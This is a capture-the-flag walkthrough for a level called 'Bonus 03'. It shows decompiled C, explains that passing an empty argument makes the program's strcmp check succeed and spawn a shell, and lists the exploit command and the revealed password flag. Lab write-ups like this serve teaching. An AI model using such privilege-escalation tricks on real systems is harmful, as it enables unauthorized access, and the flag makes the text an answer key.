# Bonus 03 Walkthrough

## Binary analysis

The binary reads two buffers from a file and uses user input as an index to null-terminate the first buffer. If the first buffer matches the input string, it spawns a shell. Otherwise, it prints the second buffer.

### Key decompiled code
```c
FILE* fp = fopen("/home/user/end/.pass", "r");
char buffer_1[0x41];
memset(buffer_1, 0, 0x84);
if (fp == 0 || argc != 2) return -1;
fread(buffer_1, 1, 0x42, fp);
buffer_1[atoi(argv[1])] = 0;
char buffer_2[0x42];
fread(buffer_2, 1, 0x41, fp);
fclose(fp);
if (strcmp(buffer_1, argv[1]) != 0)
    puts(buffer_2);
else
    execl("/bin/sh", "sh", 0);
```

## Exploitation

- By passing an empty string as the argument, `atoi(argv[1])` returns 0, so `buffer_1[0] = 0`. This makes `buffer_1` an empty string, which matches the input, and the shell is spawned.

## Commands used

```
./bonus3 ""
cat /home/user/end/.pass
```

## Result

After running the exploit, we get a shell as end and can read the password:

```
cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
